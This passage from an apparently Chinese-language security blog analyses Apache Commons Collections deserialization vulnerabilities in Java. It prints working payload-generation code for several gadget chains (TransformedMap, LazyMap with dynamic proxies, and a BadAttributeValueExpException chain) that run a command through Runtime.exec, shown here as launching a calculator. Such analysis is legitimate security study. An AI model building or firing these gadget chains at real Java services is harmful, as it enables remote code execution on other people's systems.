Constructor ctor <span style=color:#f92672>=</span> cls<span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>Class<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
ctor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
Object instance <span style=color:#f92672>=</span> ctor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>Retention<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> transformedMap<span style=color:#f92672>);</span>

<span style=color:#75715e>// the function to write searialized object to file
</span><span style=color:#75715e></span>serialize_write_file<span style=color:#f92672>(</span>instance<span style=color:#f92672>);</span>
</code></pre></div><p>然而在实际测试中发现，当前JDK版本的<code>AnnotationInvocationHandler</code>类的<code>readObject</code>函数略有变化，已经不再调用<code>setValue</code>方法，因此在反序列化时无法成功触发命令执行。</p><h4 id=利用动态代理机制的lazymap反序列化漏洞分析与测试>利用动态代理机制的LazyMap反序列化漏洞分析与测试</h4><p><code>LazyMap</code>类的<code>get</code>函数也调用了<code>transform</code>函数，当该类的<code>map</code>中不存在对应的<code>key</code>时，则会调用<code>transform</code>方法。如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>Object key<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(!</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>map</span><span style=color:#f92672>.</span><span style=color:#a6e22e>containsKey</span><span style=color:#f92672>(</span>key<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
        Object value <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>factory</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transform</span><span style=color:#f92672>(</span>key<span style=color:#f92672>);</span>
        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>map</span><span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>key<span style=color:#f92672>,</span> value<span style=color:#f92672>);</span>
        <span style=color:#66d9ef>return</span> value<span style=color:#f92672>;</span>
    <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>map</span><span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>key<span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>此处仍需利用<code>AnnotationInvocationHandler</code>类，不过该类的<code>readObject</code>函数没有调用<code>LazyMap</code>的<code>get</code>方法，但<code>invoke</code>函数中调用了<code>get</code>方法，如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>Object proxy<span style=color:#f92672>,</span> Method method<span style=color:#f92672>,</span> Object<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    String member <span style=color:#f92672>=</span> method<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>();</span>
    Class<span style=color:#f92672>&lt;?&gt;[]</span> paramTypes <span style=color:#f92672>=</span> method<span style=color:#f92672>.</span><span style=color:#a6e22e>getParameterTypes</span><span style=color:#f92672>();</span>

    <span style=color:#75715e>// Handle Object and Annotation methods
</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>member<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;equals&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> paramTypes<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span> <span style=color:#f92672>==</span> 1 <span style=color:#f92672>&amp;&amp;</span>
        paramTypes<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>==</span> Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>)</span>
        <span style=color:#66d9ef>return</span> equalsImpl<span style=color:#f92672>(</span>args<span style=color:#f92672>[</span>0<span style=color:#f92672>]);</span>
    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>paramTypes<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span> <span style=color:#f92672>!=</span> 0<span style=color:#f92672>)</span>
        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> AssertionError<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Too many parameters for an annotation method&#34;</span><span style=color:#f92672>);</span>

    <span style=color:#66d9ef>switch</span><span style=color:#f92672>(</span>member<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#34;toString&#34;</span><span style=color:#f92672>:</span>
        <span style=color:#66d9ef>return</span> toStringImpl<span style=color:#f92672>();</span>
    <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#34;hashCode&#34;</span><span style=color:#f92672>:</span>
        <span style=color:#66d9ef>return</span> hashCodeImpl<span style=color:#f92672>();</span>
    <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#34;annotationType&#34;</span><span style=color:#f92672>:</span>
        <span style=color:#66d9ef>return</span> type<span style=color:#f92672>;</span>
    <span style=color:#f92672>}</span>

    <span style=color:#75715e>// Handle annotation member accessors
</span><span style=color:#75715e></span>    Object result <span style=color:#f92672>=</span> memberValues<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>member<span style=color:#f92672>);</span>

    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>result <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span>
        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IncompleteAnnotationException<span style=color:#f92672>(</span>type<span style=color:#f92672>,</span> member<span style=color:#f92672>);</span>

    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>result <span style=color:#66d9ef>instanceof</span> ExceptionProxy<span style=color:#f92672>)</span>
        <span style=color:#66d9ef>throw</span> <span style=color:#f92672>((</span>ExceptionProxy<span style=color:#f92672>)</span> result<span style=color:#f92672>).</span><span style=color:#a6e22e>generateException</span><span style=color:#f92672>();</span>

    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>result<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>isArray</span><span style=color:#f92672>()</span> <span style=color:#f92672>&amp;&amp;</span> Array<span style=color:#f92672>.</span><span style=color:#a6e22e>getLength</span><span style=color:#f92672>(</span>result<span style=color:#f92672>)</span> <span style=color:#f92672>!=</span> 0<span style=color:#f92672>)</span>
        result <span style=color:#f92672>=</span> cloneArray<span style=color:#f92672>(</span>result<span style=color:#f92672>);</span>

    <span style=color:#66d9ef>return</span> result<span style=color:#f92672>;</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>所以此处的利用方法要用到Java的<a href=https://www.jianshu.com/p/6f6bb2f0ece9>动态代理机制</a>。</p><p>首先利用<code>AnnotationInvocationHandler</code>这一动态代理类来为<code>LazyMap</code>生成一个代理对象，然后再将该代理对象作为<code>AnnotationInvocationHandler</code>类构造方法的参数生成最终要序列化生成payload的对象。</p><p>这样在反序列化的时候，<code>AnnotationInvocationHandler</code>类的<code>readObject</code>函数在调用时会调用代理对象的方法，根据动态代理机制，也就会触发<code>AnnotationInvocationHandler</code>的<code>invoke</code>函数，进而会发生<code>LazyMap</code>类的<code>get</code>函数的调用，随后触发<code>transform</code>函数并触发命令执行。</p><p>生成payload的代码如下所示：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
        <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
        <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMethod&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Class<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
        <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invoke&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Object<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
        <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;exec&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;gnome-calculator&#34;</span><span style=color:#f92672>})</span>
<span style=color:#f92672>};</span>
Transformer transformedChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>transformers<span style=color:#f92672>);</span>


Map normalMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span>
Map lazyMap <span style=color:#f92672>=</span> LazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>normalMap<span style=color:#f92672>,</span> transformedChain<span style=color:#f92672>);</span>

<span style=color:#75715e>//lazyMap.get(&#34;key&#34;);
</span><span style=color:#75715e></span>
Class cls <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#f92672>);</span>
Constructor ctor <span style=color:#f92672>=</span> cls<span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>Class<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
ctor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>

InvocationHandler invo <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>InvocationHandler<span style=color:#f92672>)</span> ctor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>Retention<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> lazyMap<span style=color:#f92672>);</span>

Map mapProxy <span style=color:#f92672>=</span> Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>cast</span><span style=color:#f92672>(</span>Proxy<span style=color:#f92672>.</span><span style=color:#a6e22e>newProxyInstance</span><span style=color:#f92672>(</span>invo<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getClassLoader</span><span style=color:#f92672>(),</span> lazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getInterfaces</span><span style=color:#f92672>(),</span> invo<span style=color:#f92672>));</span>

Object instance <span style=color:#f92672>=</span> ctor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>Retention<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> mapProxy<span style=color:#f92672>);</span>

<span style=color:#75715e>// the function to write searialized object to file
</span><span style=color:#75715e></span>serialize_write_file<span style=color:#f92672>(</span>instance<span style=color:#f92672>);</span>
</code></pre></div><p>然而同样由于JDK版本的问题，该种方式的反序列化同样不能成功实现命令执行。（参考<a href=https://github.com/frohoff/ysoserial/issues/65>ysoserial issue</a>）</p><h4 id=利用badattributevalueexpexception类的lazymap反序列化漏洞分析与测试>利用BadAttributeValueExpException类的LazyMap反序列化漏洞分析与测试</h4><p>网络上对于Common Collections的反序列化分析基本集中于上述两种利用方式，然而它们在本文的测试环境中无法复现。</p><p>在Github上的<a href=https://github.com/frohoff/ysoserial>ysoserial</a>项目中，发现其中的CommonsCollections5可以使用，它同样是基于反序列化时调用<code>LazyMap</code>的<code>get</code>方法。</p><p>可以使用下述代码生成序列化后的payload：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
        <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
        <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMethod&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Class<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
        <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invoke&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Object<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
        <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;exec&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#e6db74>&#34;gnome-calculator&#34;</span><span style=color:#f92672>})</span>
<span style=color:#f92672>};</span>
Transformer transformedChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>transformers<span style=color:#f92672>);</span>

Map normalMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span>
Map lazyMap <span style=color:#f92672>=</span> LazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>normalMap<span style=color:#f92672>,</span> transformedChain<span style=color:#f92672>);</span>

TiedMapEntry entry <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TiedMapEntry<span style=color:#f92672>(</span>lazyMap<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;foo&#34;</span><span style=color:#f92672>);</span>

BadAttributeValueExpException val <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> BadAttributeValueExpException<span style=color:#f92672>(</span><span style=color:#66d9ef>null</span><span style=color:#f92672>);</span>
Field valfield <span style=color:#f92672>=</span> val<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;val&#34;</span><span style=color:#f92672>);</span>
valfield<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
valfield<span style=color:#f92672>.</span><span style=color:#a6e22e>set</span><span style=color:#f92672>(</span>val<span style=color:#f92672>,</span> entry<span style=color:#f92672>);</span>

serialize_write_file<span style=color:#f92672>(</span>val<span style=color:#f92672>);</span>
</code></pre></div><p>具体的命令执行触发过程如下：</p><p><code>BadAttributeValueExpException</code>类的<code>readObject</code>函数如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span><span style=color:#f92672>(</span>ObjectInputStream ois<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> IOException<span style=color:#f92672>,</span> ClassNotFoundException <span style=color:#f92672>{</span>
    ObjectInputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>GetField</span> gf <span style=color:#f92672>=</span> ois<span style=color:#f92672>.</span><span style=color:#a6e22e>readFields</span><span style=color:#f92672>();</span>
    Object valObj <span style=color:#f92672>=</span> gf<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;val&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>);</span>

    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>valObj <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
        val <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
    <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>valObj <span style=color:#66d9ef>instanceof</span> String<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
        val<span style=color:#f92672>=</span> valObj<span style=color:#f92672>;</span>
    <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>System<span style=color:#f92672>.</span><span style=color:#a6e22e>getSecurityManager</span><span style=color:#f92672>()</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>
            <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Long
            <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Integer
            <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Float
            <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Double
            <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Byte
            <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Short
            <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Boolean<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
        val <span style=color:#f92672>=</span> valObj<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>();</span>
    <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span> <span style=color:#75715e>// the serialized object is from a version without JDK-8019292 fix
</span><span style=color:#75715e></span>        val <span style=color:#f92672>=</span> System<span style=color:#f92672>.</span><span style=color:#a6e22e>identityHashCode</span><span style=color:#f92672>(</span>valObj<span style=color:#f92672>)</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;@&#34;</span> <span style=color:#f92672>+</span> valObj<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>();</span>
    <span style=color:#f92672>}</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>其中<code>valObj</code>为构造的<code>TiedMapEntry</code>类的对象，可以看到其中调用了该类的<code>toString</code>函数，再来看此<code>toString</code>函数：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>toString</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getKey</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getValue</span><span style=color:#f92672>();</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>而<code>getValue</code>函数为：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>getValue</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>map</span><span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>key</span><span style=color:#f92672>);</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>此处的<code>this.map</code>即为我们构造的<code>LazyMap</code>对象，在此处调用了<code>get</code>函数，则也就触发了命令执行代码，弹出计算器。</p><h2 id=参考资料>参考资料</h2><p><a href=https://www.sczyh30.com/posts/Java/java-reflection-1/>深入解析Java反射（1） - 基础</a></p><p><a href=https://www.jianshu.com/p/6f6bb2f0ece9>代理模式及Java实现动态代理</a></p><p><a href=https://www.secpulse.com/archives/72937.html>Apache-Commons-Collections反序列化</a></p><p><a href=https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/>JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用</a></p><p><a href=https://github.com/frohoff/ysoserial>ysoserial - Github</a></p><p><a href=https://wps2015.org/drops/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html>java反序列化工具ysoserial分析</a></p></div><div class=post-copyright><p class=copyright-item><span>Author:</span>
<span>Liq3e</span></p><p class=copyright-item><span>Link:</span>
<a href=https://blog.usec.cc/posts/security/java/java-common-collections-deserialization/>https://blog.usec.cc/posts/security/java/java-common-collections-deserialization/</a></p></div><div class=post-tags><section><i class="iconfont icon-tag"></i>Tag(s):
<span class=tag><a href=https://blog.usec.cc/tags/java/>#java</a></span>
<span class=tag><a href=https://blog.usec.cc/tags/deserialization/>#deserialization</a></span></section><section><a href=javascript:window.history.back();>back</a></span> ·
<span><a href=https://blog.usec.cc/>home</a></span></section></div><div class=post-nav><a href=https://blog.usec.cc/posts/security/pentest/oauth-2.0-security/ class=prev rel=prev title="OAuth 2.0 安全整理与分析"><i class="iconfont icon-left"></i>&nbsp;OAuth 2.0 安全整理与分析</a>
<a href=https://blog.usec.cc/posts/misc/hugo-github-pages/ class=next rel=next title="使用Github Actions自动部署Hugo至Github Pages">使用Github Actions自动部署Hugo至Github Pages&nbsp;<i class="iconfont icon-right"></i></a></div><div class=post-comment><div id=disqus_thread></div><script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return;}
var d=document,s=d.createElement('script');s.async=true;s.src='//'+"l33-1"+'.disqus.com/embed.js';s.setAttribute('data-timestamp',+new Date());(d.head||d.body).appendChild(s);})();</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></article></div></main><footer class=footer><div class=copyright>&copy;
<span itemprop=copyrightYear>2020 - 2020</span>
<span class=with-love><i class="iconfont icon-love"></i></span><span class=author itemprop=copyrightHolder><a href=https://blog.usec.cc/>Liq3e</a> |</span>
<span>Powered by <a href=https://gohugo.io/ target=_blank rel="external nofollow">Hugo</a> & <a href=https://github.com/liuzc/leaveit target=_blank rel="external nofollow">LeaveIt</a></span></div></footer><script src=/js/vendor_no_gallery.min.js async></script></div></body></html>